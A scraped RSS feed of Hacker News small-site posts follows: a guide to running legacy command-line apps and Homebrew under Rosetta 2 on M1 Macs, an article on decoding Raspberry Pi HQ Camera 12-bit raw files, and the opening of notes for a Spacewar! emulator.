November 23, 2020 | http://cutecoder.org/software/run-command-line-apple-silicon/ | <a href="https://web.archive.org/web/*/http://cutecoder.org/software/run-command-line-apple-silicon/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="post_content">
        
        	
                
        	<div>
        		<h2>Software</h2>
        		
            	<h2 id="post-3555">How to Run Legacy Command Line Apps on Apple Silicon</h2>
            	
				            	            	

				
            	
				<div>

            		<p>The new <a href="https://en.wikipedia.org/wiki/Apple_M1">M1 “Apple Silicon”</a> Macs are indeed faster than others in their respective classes. They also <a href="https://techcrunch.com/2020/11/17/yeah-apples-m1-macbook-pro-is-powerful-but-its-the-battery-life-that-will-blow-you-away/">outperformed a number of higher-classed Mac</a> released just one year ago.</p>
<p>However if you’re depending on command-line applications, things aren’t so pretty. Notably open-source ones. <a href="https://en.wikipedia.org/wiki/GNU_Compiler_Collection">Gnu’s Compiler Collection</a> is <a href="https://gcc.gnu.org/bugzilla/show_bug.cgi?id=96168#c11">yet to support ARM64 on the Mac</a>. Which is impeding support for many numerical libraries based on <a href="https://en.wikipedia.org/wiki/Fortran">Fortran</a> such as <a href="https://www.scipy.org/scipylib/faq.html#what-is-scipy">SciPy</a>. Even <a href="https://en.wikipedia.org/wiki/Homebrew_(package_manager)">Homebrew</a> doesn’t fully support the new instruction set:</p>
<blockquote><p>
Warning: You are running macOS on a arm64 CPU architecture.<br>
We do not provide support for this (yet).<br>
Reinstall Homebrew under Rosetta 2 until we support it.<br>
You will encounter build failures with some formulae.<br>
Please create pull requests instead of asking for help on Homebrew’s GitHub,<br>
Twitter or any other official channels. You are responsible for resolving<br>
any issues you experience while you are running this<br>
unsupported configuration.
</p></blockquote>
<p>Wouldn’t it be great if you can continue using open-source command-line application on your shiny new Apple Silicon Mac? Notably since the first-generation processor is already <a href="https://www.macrumors.com/2020/11/15/m1-chip-emulating-x86-benchmark/">running Intel-based applications faster</a> than most Mac that came before it?</p>
<p>Yes you can, thanks to Rosetta 2. This is the compatibility layer that allows running <a href="https://en.wikipedia.org/wiki/Mac_transition_to_Apple_Silicon">Intel-based Mac applications on Apple Silicon</a>. The system is also available for command-line applications, although turning it on would take some work.</p>
<h2>The Rosetta Shell</h2>
<p>When your command-line application or system hasn’t support the <a href="https://en.wikipedia.org/wiki/ARM_architecture">ARM64</a> instruction set, you’ll need to run it from <a href="https://en.wikipedia.org/wiki/Terminal_(macOS)">Terminal</a> sessions in Intel mode. That way, all subsequent command line applications started from the shell would be run under Rosetta 2 – including <em>universal binaries</em>. In other words, when an application has <em>both</em> <a href="https://en.wikipedia.org/wiki/Intel">Intel</a> and <a href="https://en.wikipedia.org/wiki/Arm_Ltd.">Arm</a> variations, the Intel one would be chosen as well as any other child processes of the application.</p>
<p>Here is how you can force the shell to run in Intel mode so that you can continue working in this little command-line <a href="https://en.wikipedia.org/wiki/Rosetta_(software)#Rosetta_2">Rosetta</a> Island while waiting for native ARM64 support.</p>
<ol>
<li>
Open the <a href="https://en.wikipedia.org/wiki/Terminal_(macOS)">Terminal</a> app.
</li>
<li>
Open the Terminal app’s Preferences.
</li>
<li>
Click on the <em>Profiles</em> tab.
</li>
<li>
Select a profile, click on the ellipsis at the bottom of the profile list and then select <em>Duplicate Profile</em>.
</li>
<li>
Click on the new profile and give it a good name. I named mine as “Rosetta Shell”.
</li>
<li>
Also in the new profile, click on the <em>Window</em> tab. In the <em>Title</em>, put a name to indicate that this is for running Intel-based apps. I put “Terminal (Intel)” on mine.
</li>
<li>
Click on the <em>Shell</em> tab and use the following as its <em>Run Command</em> to force the shell run under Rosetta:
<pre>env /usr/bin/arch -x86_64 /bin/zsh --login
</pre>
</li>
<li>
Untick the <em>Run inside shell</em> checkbox. Clearing the checkbox would prevent running the shell twice, which could bloat your environment variables since <code>~/.zshrc</code> gets run twice.
</li>
<li>
Optionally set this profile as the <em>Default</em>.
</li>
</ol>
<p>That’s it. The next Terminal window would open the new profile and run command-line applications as Intel binaries.</p>
<p><img loading="lazy" title="run-terminal-rosetta@2x.png" src="https://cutecoder.org/wp-content/uploads/2020/11/run-terminal-rosetta@2x.png" alt="Run shell under Rosetta 2" width="744" height="390" data-lazy-src="https://cutecoder.org/wp-content/uploads/2020/11/run-terminal-rosetta@2x.png?is-pending-load=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></p>
<h2>Installing Homebrew</h2>
<p>As of this writing, Homebrew recommends <a href="https://docs.brew.sh/Installation">two separate installations</a> for ARM64 systems:</p>
<ul>
<li><code>/usr/local/homebrew</code> – For Intel-only packages, which coincidentally the traditional install location.</li>
<li><code>/opt/homebrew</code> – To install/run packages that already has Apple Silicon support.</li>
</ul>
<p>Here is how you can install Homebrew manually on Apple Silicon systems</p>
<ol>
<li>
Open the Rosetta Shell.
</li>
<li>
Run the following commands:
<pre>cd /usr/local
sudo mkdir homebrew
sudo chgrp admin homebrew
sudo chmod g+rwx homebrew
curl -L https://github.com/Homebrew/brew/tarball/master | tar xz --strip 1 -C homebrew
</pre>
</li>
<li>
Add the following snippet to your <code>~/.zshrc</code> to automatically choose which Homebrew installation to use depending whether it is running on Rosetta:
<pre>if [ "$(sysctl -n sysctl.proc_translated)" = "1" ]; then
    local brew_path="/usr/local/homebrew/bin"
else
    local brew_path="/opt/homebrew/bin"
fi
export PATH="${brew_path}:${PATH}"
</pre>
</li>
</ol>
<h2>Next Steps</h2>
<p>Try this out and see how it goes. Install your favorite Intel-based command-line applications (suggestion: <code>gcc</code>) and see how it performs. Then have a look at <a href="https://github.com/Homebrew/brew/issues/7857">Homebrew’s ARM64 compatibility tracking</a> to see how support for the new processor is going.</p>
<br>
<hr>

<!-- Begin MailChimp Signup Form -->




<!--End mc_embed_signup-->

											

				</div>
				
    

<!-- You can start editing here. -->


		

		
		</div>
            
            
             
        
        </div></div>]]>
            </description>
            <link>http://cutecoder.org/software/run-command-line-apple-silicon/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25195321</guid>
            <pubDate>Tue, 24 Nov 2020 04:38:58 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Understanding the Raspberry Pi HQ Raw format]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25195317">thread link</a>) | @Greg_hamel
<br/>
November 23, 2020 | https://www.strollswithmydog.com/open-raspberry-pi-high-quality-camera-raw/ | <a href="https://web.archive.org/web/*/https://www.strollswithmydog.com/open-raspberry-pi-high-quality-camera-raw/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		<p>The Raspberry Pi Foundation recently released an interchangeable lens camera module based on the Sony&nbsp; IMX477, a 1/2.3″ back side illuminated sensor with 3040×4056 pixels of 1.55um pitch.&nbsp; In this somewhat technical article we will unpack the 12-bit raw still data that it produces and render it in a convenient color space.</p>
<figure id="attachment_4271" aria-describedby="caption-attachment-4271"><a href="https://i0.wp.com/www.strollswithmydog.com/wordpress/wp-content/uploads/StillLife-f8-g1-ARGB.jpg?ssl=1"><img loading="lazy" src="https://i0.wp.com/www.strollswithmydog.com/wordpress/wp-content/uploads/StillLife-f8-g1-ARGB.jpg?resize=474%2C313&amp;ssl=1" alt="still life raw capture data file raspberry pi high quality hq cam f/8 1/2s base analog gain iso adobe rgb" width="474" height="313" srcset="https://i0.wp.com/www.strollswithmydog.com/wordpress/wp-content/uploads/StillLife-f8-g1-ARGB.jpg?w=1662&amp;ssl=1 1662w, https://i0.wp.com/www.strollswithmydog.com/wordpress/wp-content/uploads/StillLife-f8-g1-ARGB.jpg?resize=300%2C198&amp;ssl=1 300w, https://i0.wp.com/www.strollswithmydog.com/wordpress/wp-content/uploads/StillLife-f8-g1-ARGB.jpg?resize=768%2C507&amp;ssl=1 768w, https://i0.wp.com/www.strollswithmydog.com/wordpress/wp-content/uploads/StillLife-f8-g1-ARGB.jpg?resize=1536%2C1014&amp;ssl=1 1536w, https://i0.wp.com/www.strollswithmydog.com/wordpress/wp-content/uploads/StillLife-f8-g1-ARGB.jpg?w=948&amp;ssl=1 948w, https://i0.wp.com/www.strollswithmydog.com/wordpress/wp-content/uploads/StillLife-f8-g1-ARGB.jpg?w=1422&amp;ssl=1 1422w" sizes="(max-width: 474px) 100vw, 474px" data-recalc-dims="1"></a><figcaption id="caption-attachment-4271">Figure 1. 12-bit raw capture by Raspberry Pi High Quality Camera with 16 mm kit lens at f/8, 1/2 s, base ISO. The image was loaded into Matlab and rendered Half Height Nearest Neighbor in the Adobe RGB color space with a touch of local contrast and sharpening.&nbsp; Click on it to see it in its own tab and view it at 100% magnification. If your browser is not color managed you may not see colors properly.</figcaption></figure>

<h4>My First Open Source ILC</h4>
<p>When the HQ module was announced a couple of weeks ago I was excited to discover that it came with a CS standard mount, opening the possibility of using any lens ever made with it – as long as it respected back flange limits and an adapter were available.&nbsp; Finally an inexpensive open source ‘camera’ with a decent sensor and interchangeable lenses of potentially photographic quality.</p>
<p>Mine arrived a few days ago.&nbsp; The CS mount affixed to the board has V1.0 2018 markings and it came with a CS-C adapter, which was promptly used to attach the 16mm f/1.4-16 C ‘kit’ lens.&nbsp; The lens is from CGL Electronic Co. LTD, a Chinese company specialized “in the R&amp;D, production and sale of accessories for smartphones, as well as Bluetooth products”.&nbsp; One of their lines is Megapixel CCTV lenses, and this one is spec’d at 10 MP, as printed on the box.&nbsp; What size P that refers to, we are not told.&nbsp; Its field of view is about 27.6 degrees on the diagonal, equivalent to roughly 88mm on Full Frame.</p>
<h4>The Sensor</h4>
<p>The IMX477 was released in December 2016 by Sony.&nbsp; It is a 1/2.3″ 4:3 Back Side Illuminated, Stacked Exmor CMOS sensor designed for “consumer use camcorder” applications, though in this article I will evaluate its ability to capture still images, thus&nbsp; ignoring Sony’s stated use case.&nbsp; Given its tinkering potential, I am sure I will not be the first or last to do so.</p>
<p>There are 3040×4056 pixels usable for imaging, with a 1.55um pitch.&nbsp; This portends a sensor active area of 4.712 x&nbsp; 6.287 mm with a 7.857mm diagonal, implying a 5.51x multiplier compared to, say, a Full Frame Nikon Z7 with 5520×8288 4.35um pixels.</p>
<p>It sports a Bayer Color Filter Array in the BGGR configuration.&nbsp; If the figure reported in the MakerNote is to be trusted, its fully electronic shutter has a minimum speed of&nbsp; 1/8771.9 of a second and it has been clocked at a maximum of 239 s.&nbsp; &nbsp;It is capable of producing 12-bit raw data when in still mode.&nbsp; You can read more about its specs and performance in the <a href="https://www.strollswithmydog.com/pi-hq-cam-sensor-performance/" target="_blank" rel="noopener noreferrer">next article</a>.</p>
<h4>Unpacking the 12-bit Raw Data</h4>
<p>When the -r or –raw switch is used with the Pi’s still image command <strong>raspistill</strong> (see the post scriptum at bottom for raspiraw), 12-bit raw CFA data is appended to the resulting 8 bit jpg file, in a block starting with the characters ‘BRCM’.&nbsp; &nbsp;The first part of the block is a 2^15 byte header, which I ignore, followed by the (3040+16)x(4056+28B) sensor array data written row-wise.&nbsp; The key is realizing that there are 3056 total rows and formatting the data accordingly.</p>
<p>Each row consists of 4056 12-bit elements (4056*12/8 bytes), followed by 12 bytes of zeros and 16 bytes of&nbsp; non-imaging data.&nbsp; The 12 bytes of zeros mark the end of the active area all the way down to the 3040th row.&nbsp; After that there are 16 additional rows of full length system data.&nbsp; In the past this non-imaging system data included optical black pixels that helped determine BlackLevels dynamically, but recent sensors tend not to have clearly demarcated such patches and I was not able to identify them.&nbsp; Should you know more about these service rows and columns I would be interested in the details.</p>
<p>From the start of every row to the twelve zeros, pixel raw values are packed in triplets: three 8-bit bytes are written for every two&nbsp; 12-bit pixels in the following format</p>
<p>AAAAAAAA BBBBBBBB BBBBAAAA</p>
<p>The first two bytes represent the 8 individual&nbsp; high bits while the third one contains the 4×2 respective low bits as shown.&nbsp; Unpacking them is easily accomplished in Matlab (and with a bit of adaptation Octave or your interpreter of choice)<sup><a title="The Matlab/Octave function used in this page to open, unpack and render full resolution Raspberry Pi HQ Camera 12-bit raw stills created by raspistill -r&nbsp; and raspiraw can be downloaded from here." href="#footnote">[1]</a></sup> as follows, vector ‘bin’ holds pixel data row-wise:</p>
<figure id="attachment_4276" aria-describedby="caption-attachment-4276"><a href="https://i0.wp.com/www.strollswithmydog.com/wordpress/wp-content/uploads/Unpack12bitRaw.png?ssl=1"><img loading="lazy" src="https://i0.wp.com/www.strollswithmydog.com/wordpress/wp-content/uploads/Unpack12bitRaw.png?resize=474%2C59&amp;ssl=1" alt="matlab octave code unpack raspberry pi hq high quality camera raw file jpg jpeg 12 bit " width="474" height="59" srcset="https://i0.wp.com/www.strollswithmydog.com/wordpress/wp-content/uploads/Unpack12bitRaw.png?w=559&amp;ssl=1 559w, https://i0.wp.com/www.strollswithmydog.com/wordpress/wp-content/uploads/Unpack12bitRaw.png?resize=300%2C37&amp;ssl=1 300w" sizes="(max-width: 474px) 100vw, 474px" data-recalc-dims="1"></a><figcaption id="caption-attachment-4276">Figure 2. Unpacking 12 bit raw data loaded from Raspberry Pi High Quality Camera jpeg generated by raspistill -r.&nbsp; Full Matlab code available at the bottom of the article.</figcaption></figure>
<p>The full function used in this page can be downloaded from the link at the end of the article.&nbsp; So now we have the Pi HQ Camera’s 12-bit raw CFA data in 16-bit integer format.</p>
<h4>Exif and MakerNotes</h4>
<p>There is very little information in the jpeg Exif tags and some of it is incorrect unless explicitly set by the user.&nbsp; For instance any information related to the lens, like focal length or f-number, because the module and the lens don’t speak to each other.&nbsp; The goodies are instead in the<strong> MakerNotes</strong>, where we can find white balance multipliers, a compromise color matrix and more.&nbsp; The field is made up of a few hundred characters, here is the one from the capture in Figure 3 below:</p>
<p>ev=-1 mlux=-1<br>
exp=900 ag=256 focus=255<br>
gain_r=3.238 gain_b=1.515 greenness=0 ccm=8466,-3816,-550,-476,6390,-1816,302,-1790,5588,0,0,0 md=0 tg=247 247 oth=247 216 b=0 f=247 247 fi=0<br>
ISP Build Date: Feb 12 2020, 12:39:13 VC_BUILD_ID_VERSION: 53a54c770c493957d99bf49762dfabc4eee00e45 (clean) VC_BUILD_ID_USER: dom VC_BUILD_ID_BRANCH: master</p>
<p>Ignore ev (EC) and mlux, which appear fixed.&nbsp; Then:</p>
<ul>
<li><strong>exp</strong> is Exposure Time in microseconds</li>
<li><strong>ag</strong> divided by 256 is Analog Gain, related to ISO, so in this case it had a value of 1 (the range is 1 to 16)</li>
<li><strong>gain_r</strong> and <strong>gain_b</strong> are the white balance multipliers; greenness has so far always been zero in my experience</li>
<li><strong>ccm</strong> is the Compromise Color Matrix, divide by 4096 and drop the last row of offsets that in my tests has always been zero.</li>
</ul>
<p>I don’t know what the rest of the entries are but I suspect they are related to automatic exposure because they all turn to zero when that mode is turned off (-ex off, undocumented but all I use).</p>
<h4>Decoding the Matrix</h4>
<p>The matrix in the MakerNote looks like this:</p>
<p><a href="https://i2.wp.com/www.strollswithmydog.com/wordpress/wp-content/uploads/sRGB-Matrix.png?ssl=1"><img loading="lazy" src="https://i2.wp.com/www.strollswithmydog.com/wordpress/wp-content/uploads/sRGB-Matrix.png?resize=284%2C53&amp;ssl=1" alt="" width="284" height="53" data-recalc-dims="1"></a></p>
<p>It changes with the lighting, so I would guess that the module interpolates it based on the estimated illuminant.&nbsp; Where does this matrix take us?&nbsp; It looks very much like a demosaiced, white-balanced data to sRGB matrix.</p>
<p>To find out I took my setup to the balcony in a veiled, sunny, city afternoon to capture a purposely slightly defocused ColorChecker 24 target.&nbsp; Here is the image produced by the Pi’s GPU-accelerated on-board engine, straight Out Of Camera:</p>
<figure id="attachment_4281" aria-describedby="caption-attachment-4281"><a href="https://i2.wp.com/www.strollswithmydog.com/wordpress/wp-content/uploads/piHQ-CC24-a.jpg?ssl=1"><img loading="lazy" src="https://i2.wp.com/www.strollswithmydog.com/wordpress/wp-content/uploads/piHQ-CC24-a.jpg?resize=474%2C355&amp;ssl=1" alt="out of camera ooc raw capture cc24 colorchecker whibal base analgo gain iso slightly out of focus oof raspberry pi hq cam high quality" width="474" height="355" srcset="https://i2.wp.com/www.strollswithmydog.com/wordpress/wp-content/uploads/piHQ-CC24-a.jpg?resize=1601%2C1200&amp;ssl=1 1601w, https://i2.wp.com/www.strollswithmydog.com/wordpress/wp-content/uploads/piHQ-CC24-a.jpg?resize=300%2C225&amp;ssl=1 300w, https://i2.wp.com/www.strollswithmydog.com/wordpress/wp-content/uploads/piHQ-CC24-a.jpg?resize=768%2C576&amp;ssl=1 768w, https://i2.wp.com/www.strollswithmydog.com/wordpress/wp-content/uploads/piHQ-CC24-a.jpg?resize=1536%2C1151&amp;ssl=1 1536w, https://i2.wp.com/www.strollswithmydog.com/wordpress/wp-content/uploads/piHQ-CC24-a.jpg?w=1900&amp;ssl=1 1900w, https://i2.wp.com/www.strollswithmydog.com/wordpress/wp-content/uploads/piHQ-CC24-a.jpg?w=948&amp;ssl=1 948w, https://i2.wp.com/www.strollswithmydog.com/wordpress/wp-content/uploads/piHQ-CC24-a.jpg?w=1422&amp;ssl=1 1422w" sizes="(max-width: 474px) 100vw, 474px" data-recalc-dims="1"></a><figcaption id="caption-attachment-4281">Figure 3. Out of Camera sRGB jpeg image produced by raspistill -r with a Raspberry Pi High Quality Camera and 16mm CS lens at f/5.6. It is purposedly defocused to smooth out the impact of irregularities in the patches.</figcaption></figure>
<p>It looks a bit desaturated.&nbsp; Extracting the raw values of the 24 CC patches as described in the article on <a href="https://www.strollswithmydog.com/determining-forward-color-matrix/" target="_blank" rel="noopener noreferrer">determining the Forward Matrix</a> we obtain the following fit against BabelColor’s 30 database, assuming about a 5800K D illuminant, as suggested by the color meter:</p>
<p><a href="https://i1.wp.com/www.strollswithmydog.com/wordpress/wp-content/uploads/Full-Matrix.png?ssl=1"><img loading="lazy" src="https://i1.wp.com/www.strollswithmydog.com/wordpress/wp-content/uploads/Full-Matrix.png?resize=474%2C502&amp;ssl=1" alt="" width="474" height="502" srcset="https://i1.wp.com/www.strollswithmydog.com/wordpress/wp-content/uploads/Full-Matrix.png?w=510&amp;ssl=1 510w, https://i1.wp.com/www.strollswithmydog.com/wordpress/wp-content/uploads/Full-Matrix.png?resize=283%2C300&amp;ssl=1 283w" sizes="(max-width: 474px) 100vw, 474px" data-recalc-dims="1"></a></p>
<p>The white-balanced data to sRGB matrix looks fairly similar to the one in the HQ Camera’s MakerNotes, suggesting that its purpose is indeed the same, something I have since confirmed with subsequent captures.&nbsp; A Sensitivity Metamerism Index (SMI) of 88 indicates a pretty good fit – thus colorimetrically friendly CFA dies, well done!&nbsp; &nbsp;These are the dE2000 errors for the target under the current D5800 illuminant and the white balanced ‘raw’ to XYZ Forward Matrix above:</p>
<figure id="attachment_4289" aria-describedby="caption-attachment-4289"><a href="https://i2.wp.com/www.strollswithmydog.com/wordpress/wp-content/uploads/dE2000.png?ssl=1"><img loading="lazy" src="https://i2.wp.com/www.strollswithmydog.com/wordpress/wp-content/uploads/dE2000.png?resize=461%2C288&amp;ssl=1" alt="raspberry pi high quality hq cam base analog gain iso deltaE 2000 raw capture CC24 colorchecker CFA SSF spectral sensitivity functions" width="461" height="288" srcset="https://i2.wp.com/www.strollswithmydog.com/wordpress/wp-content/uploads/dE2000.png?w=461&amp;ssl=1 461w, https://i2.wp.com/www.strollswithmydog.com/wordpress/wp-content/uploads/dE2000.png?resize=300%2C187&amp;ssl=1 300w" sizes="(max-width: 461px) 100vw, 461px" data-recalc-dims="1"></a><figcaption id="caption-attachment-4289">Figure 4. CIEDE2000 difference from BabelColor30 ColorChecker database reference data when the derived matrix was applied to the relative raw capture. It indicates a very good fit, suggesting colorimetrically friendly CFA spectral sensitivity functions in the HQ camera.</figcaption></figure>
<p>Very good results.&nbsp; Using the D5800 Forward Matrix so discovered we can easily calculate matrices for any of the standard color spaces around this color temperature, as described in the linked article.</p>
<h4>Rendering 12-bit Raw Data to sRGB</h4>
<p>We now have the raw data, white balance multipliers and matrix necessary to render the captured raw image to a final color space.&nbsp; I used simplified demosaicing that results in a half height image with every final pixel corresponding to a BGGR quartet in the CFA, similar to dcraw -h.&nbsp; Each color channel within a pixel maintains the relative BlackLevel subtracted ‘raw’ R and B values while the two G values are averaged, as described in the <a href="https://www.strollswithmydog.com/raw-file-conversion-steps/" target="_blank" rel="noopener noreferrer">article on rendering</a>:</p>
<figure id="attachment_4400" aria-describedby="caption-attachment-4400"><a href="https://i1.wp.com/www.strollswithmydog.com/wordpress/wp-content/uploads/Half-Demosaic-HQ.png?ssl=1"><img loading="lazy" src="https://i1.wp.com/www.strollswithmydog.com/wordpress/wp-content/uploads/Half-Demosaic-HQ.png?resize=474%2C99&amp;ssl=1" alt="" width="474" height="99" srcset="https://i1.wp.com/www.strollswithmydog.com/wordpress/wp-content/uploads/Half-Demosaic-HQ.png?w=670&amp;ssl=1 670w, https://i1.wp.com/www.strollswithmydog.com/wordpress/wp-content/uploads/Half-Demosaic-HQ.png?resize=300%2C63&amp;ssl=1 300w" sizes="(max-width: 474px) 100vw, 474px" data-recalc-dims="1"></a><figcaption id="caption-attachment-4400">Figure 5. Standard Matlab/Octave code[1] to convert raw CFA data to 16-bit standard color spaces. It produces a half-height image without interpolation.&nbsp; See the linked article for details.</figcaption></figure><p>The Black Level is about 256.3 at base gain/ISO in my unit at room temperature, as we will see in the next article.&nbsp; Applying that script to the captured raw CFA data results in the following ‘final’ sRGB image:</p>
<figure id="attachment_4283" aria-describedby="caption-attachment-4283"><a href="https://i0.wp.com/www.strollswithmydog.com/wordpress/wp-content/uploads/CC24-PiHQ-5800K.jpg?ssl=1"><img loading="lazy" src="https://i0.wp.com/www.strollswithmydog.com/wordpress/wp-content/uploads/CC24-PiHQ-5800K.jpg?resize=474%2C355&amp;ssl=1" alt="raspberry pi high quality hq cam color checker passport cc24 5800k base analog gain iso slightly out of focus raw conversion" width="474" height="355" srcset="https://i0.wp.com/www.strollswithmydog.com/wordpress/wp-content/uploads/CC24-PiHQ-5800K.jpg?resize=1601%2C1200&amp;ssl=1 1601w, https://i0.wp.com/www.strollswithmydog.com/wordpress/wp-content/uploads/CC24-PiHQ-5800K.jpg?resize=300%2C225&amp;ssl=1 300w, https://i0.wp.com/www.strollswithmydog.com/wordpress/wp-content/uploads/CC24-PiHQ-5800K.jpg?resize=768%2C576&amp;ssl=1 768w, https://i0.wp.com/www.strollswithmydog.com/wordpress/wp-content/uploads/CC24-PiHQ-5800K.jpg?resize=1536%2C1151&amp;ssl=1 1536w, https://i0.wp.com/www.strollswithmydog.com/wordpress/wp-content/uploads/CC24-PiHQ-5800K.jpg?w=1800&amp;ssl=1 1800w, https://i0.wp.com/www.strollswithmydog.com/wordpress/wp-content/uploads/CC24-PiHQ-5800K.jpg?w=948&amp;ssl=1 948w, https://i0.wp.com/www.strollswithmydog.com/wordpress/wp-content/uploads/CC24-PiHQ-5800K.jpg?w=1422&amp;ssl=1 1422w" sizes="(max-width: 474px) 100vw, 474px" data-recalc-dims="1"></a><figcaption id="caption-attachment-4283">Figure 6. Raspberry Pi HQ Camera with 16mm kit lens at f/5.6 sRGB image.&nbsp; It was converted from raw after loading the raspistill -r jpeg, unpacking the raw data, subtracting black level, applying white balance multipliers and the matrix.</figcaption></figure>
<p>Much better, though we know from previous posts that this linear rendition probably still needs to be mapped into the smaller Contrast Ratio of typical display devices with the help of a Tone Mapping Operator or, at the very least, a bit of contrast.</p>
<h4>And Full-Rez to Adobe RGB</h4>
<p>Of course after doing all that it becomes apparent that the small size of the HQ’s pixels bump against their physical limitations.&nbsp; &nbsp;Images from this sensor are bound to look a bit fuzzy and noisy compared to those produced by larger cousins of similar resolution when demosaiced to full size and shown at 100%:&nbsp; there are only so many photoelectrons to be captured and diffraction to be oversampled when you are 1.55 …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.strollswithmydog.com/open-raspberry-pi-high-quality-camera-raw/">https://www.strollswithmydog.com/open-raspberry-pi-high-quality-camera-raw/</a></em></p>]]>
            </description>
            <link>https://www.strollswithmydog.com/open-raspberry-pi-high-quality-camera-raw/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25195317</guid>
            <pubDate>Tue, 24 Nov 2020 04:38:13 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Spacewar]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25195214">thread link</a>) | @cristoperb
<br/>
November 23, 2020 | https://www.masswerk.at/spacewar/ | <a href="https://web.archive.org/web/*/https://www.masswerk.at/spacewar/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="description">
	<h2>Notes &amp; Descriptions</h2>
	<h3>Program Versions &amp; Sources</h3>
	<p>The emulation is running various versions of the original game, both from binaries copies of the original paper tapes and newly assembled from authentic code listings. The programs are loaded as virtual paper tapes (RIM-mode: Read In Memory) into the memory of the emulated DEC PDP-1.</p>
	<p><img src="https://www.masswerk.at/spacewar/images/hingham-space-warfare-2.png" alt="Spaceships (stylized) according to the Hingham Institute Study Group on Space Warfare" title="Spaceships according to the Hingham Institute Study Group on Space Warfare" width="81" height="94"></p><p><strong onclick="selectSpacewarModule('spacewar3.1');" data-title="Click to play Spacewar! 3.1"><span></span>Spacewar! 3.1</strong>, the final version of Spacewar! as left by the original programmers (Steve Russell and the other members of the <em>Hingham Institute Study Group on Space Warfare</em>), is presented here once in its original form and in a modified version showing scaled up graphics and effects for the benefit of small screen sizes. Further, there are both earlier and later versions, as <strong onclick="selectSpacewarModule('spacewar2b');" data-title="Click to play Spacewar! 2B"><span></span>Spacewar! 2B</strong> (the program described in <a href="https://www.masswerk.at/spacewar/SpacewarOrigin.html" target="SpacewarOrigin">"The Origin of Spacewar"</a> by J. M. Graetz) and some examples of <strong onclick="selectSpacewarModule('spacewar4.1f');" data-title="Click to play Spacewar! 4.1f"><span></span>version 4</strong> (adding minor features and compatibility to an upgraded hardware). Finally, there is a special version of Spacewar 3.1, demonstrating the "Winds of Space" effect.</p>
	<p><em>(Please mind that the title screens are generated by the emulator and are not part of the original games.)</em></p>
	<p>There are two display resolutions to select from:</p>
	<ul>
		<li><strong>Low resolution</strong>, plotting at 512 x 512 px, 50% of the original display.<br>Special subpixel rendering is employed in order to boost the visible resolution beyond the physical resolution provided by the display element in the browser.<br>The result corresponds closely (if not being even a bit better) to the visual resolution of the original display: While the display featured a resolution of 1024 x 1024 plotting locations, only approximately 512 points on each axis were "resolvable to the unaided eye" <cite>(DP-35-2 / PDP-1 Instruction Manual / Part 3; DEC 1971; p. 5)</cite>.<br>Compare these contemporary photos: <a href="https://www.masswerk.at/spacewar/SpacewarOrigin.html#figure-1" target="SpacewarOrigin" title="Illustrative image in &quot;The Origin of Spacewar&quot; by J. M. Graetz" onclick="if (window.showEmbeddedImage) {return showEmbeddedImage('spacewar_origins/spacewar-fig1.jpeg', 421, 418);} else {return true;}">[1]</a> <a href="https://www.masswerk.at/spacewar/SpacewarOrigin.html#figure-a3-7" target="SpacewarOrigin" title="A black and white screenshot of Spacewar!, 1963 ca." onclick="if (window.showEmbeddedImage) {return showEmbeddedImage('spacewar_origins/chm-spacewar_screenshot.jpg', 500, 391);} else {return true;}">[2]</a> <a href="https://www.masswerk.at/spacewar/SpacewarOrigin.html#figure-a3-6" target="SpacewarOrigin" title="Dan Edwards and Peter Samson playing Spacewar! (DEC material)" onclick="if (window.showEmbeddedImage) {return showEmbeddedImage('spacewar_origins/playing-spacewar-1962.jpg', 500, 340);} else {return true;}">[3]</a>.</li>
		<li><strong>High resolution</strong>, plotting at the <a href="https://www.masswerk.at/spacewar/fullscreen.html" data-title="Compare the full-scale version…"><span></span>original 1024 x 1024 px</a>, with the display element scaled to 50%.</li>
	</ul>
	<p>Versions available (by the <i>"versions menu"</i> at the top left of the emulated display):</p>
	<ul>

		<li id="spacewar3.1"><strong onclick="selectSpacewarModule('spacewar3.1');" data-title="Click to select this program."><span></span>Spacewar! 3.1</strong> <span>(24 Sep 1962)</span><br>This could be regarded as the "standard version" of Spacewar!. The program is dated <em>"24 sep 62"</em> and is loaded from an authentic binary paper-tape image (<a href="http://textfiles.com/bitsavers/bits/DEC/pdp1/papertapeImages/20031202/SteveRussell_box1/" target="_blank" title="Archive of Steve Russell's box #1 at textfiles.com">spacewar3.1_24-sep-62.bin</a>) provided by Steve Russell via <a href="http://bitsavers.org/" target="_blank">bitsavers.org</a>.</li>

		<li><strong onclick="selectSpacewarModule('spacewar3.1bigships');" data-title="Click to select this program."><span></span>Spacewar! 3.1, scaled ships</strong> <span>(low resolution only)</span><br>Scaled up graphics and effects to show the game in greater detail on a small display. (Colission radii and turning pivots of the ships have been adjusted accordingly.) This is quite similar to the presentation seen in other emulations. Please mind that the changes have minor effects on the gameplay.<br>
		The code is based on the original PDP-1 <a href="http://textfiles.com/bitsavers/bits/DEC/pdp1/papertapeImages/20031202/SteveRussell_box1/_text/" target="_blank" title="Text-files in the archive of Steve Russell's box #1 at textfiles.com">assembler sources</a> by Steve Russell as available at <a href="http://bitsavers.org/" target="_blank">bitsavers.org</a> and was modified and newly assembled in 2014. (N. Landsteiner, 2014; this is not an authentic version!)</li>

